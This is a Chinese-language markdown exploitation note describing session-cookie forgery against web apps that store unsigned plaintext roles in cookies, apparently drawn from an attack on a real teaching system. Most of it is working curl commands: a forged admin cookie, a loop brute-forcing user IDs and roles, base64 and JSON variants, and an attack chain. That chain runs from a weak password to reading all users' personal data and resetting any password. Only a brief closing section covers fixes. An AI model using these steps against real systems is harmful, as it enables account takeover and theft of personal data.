# Session Cookie伪造攻击模式 (2026-05-18 教学系统实战)

## 漏洞原理
自建Web应用(Go/Python/Node.js)常使用客户端session，cookie值为纯文本格式：
`用户ID|用户名|显示名|角色` 或 `用户ID:用户名:角色`
无HMAC签名、无加密、无完整性校验。

## 检测方法
```bash
# 1. 登录获取cookie
curl -sk -D- -X POST 'http://target/login' -d 'username=X&password=Y' | grep -i set-cookie

# 2. 分析cookie格式
# 常见格式：
#   id|username|displayname|role  (本案例)
#   id:username:role
#   base64(id:username:role)
#   JSON {"id":1,"user":"admin","role":"admin"}

# 3. 确认无签名 - 修改值后仍能访问
curl -sk -b "session=MODIFIED_VALUE" 'http://target/protected'
```

## 利用步骤

### Step 1: 确定有效格式
用已知账号登录，记录cookie值和对应的用户信息。

### Step 2: 枚举用户ID和角色
```bash
# 角色名通常为: admin, teacher, student, user, manager
# 用户ID通常从1开始递增
```

### Step 3: 伪造admin cookie
```bash
# 原始: 2|teacher1|Teacher One|teacher
# 伪造: 1|admin|Admin|admin
admin_cookie="kvm_session=1%7Cadmin%7CAdmin%7Cadmin"
curl -sk -b "$admin_cookie" 'http://target/admin/dashboard'
```

### Step 4: 批量验证
```bash
for id in $(seq 1 50); do
  for role in admin teacher student; do
    code=$(curl -sk -o /dev/null -w "%{http_code}" \
      -b "session=$id|admin|Admin|$role" 'http://target/admin/dashboard')
    [ "$code" = "200" ] && echo "HIT: id=$id role=$role"
  done
done
```

## 完整攻击链 (本案例)
1. 弱口令 teacher1:teacher1 登录
2. Set-Cookie: kvm_session=2%7Cteacher1%7CTeacher+One%7Cteacher
3. 伪造: kvm_session=1%7Cadmin%7CAdmin%7Cadmin
4. 访问 /admin/users → 全部用户信息(姓名/手机/邮箱)
5. POST /admin/users/{id}/reset-password → 重置任意用户密码
6. 用新密码登录 → 完全接管

## 变体: Base64编码的session
```bash
# 如果cookie是base64编码
echo -n '1:admin:admin' | base64  # MToxOmFkbWlu
curl -sk -b "session=MToxOmFkbWlu" 'http://target/admin'
```

## 变体: JSON格式的session
```bash
# 如果cookie是JSON
echo -n '{"id":1,"user":"admin","role":"admin"}' | base64
curl -sk -b "session=BASE64_VALUE" 'http://target/admin'
```

## 修复方案
1. 使用服务端session(session ID → 服务端存储)
2. 如果必须客户端存储，使用HMAC-SHA256签名
3. JWT方案: HS256签名 + 过期时间 + audience/issuer校验
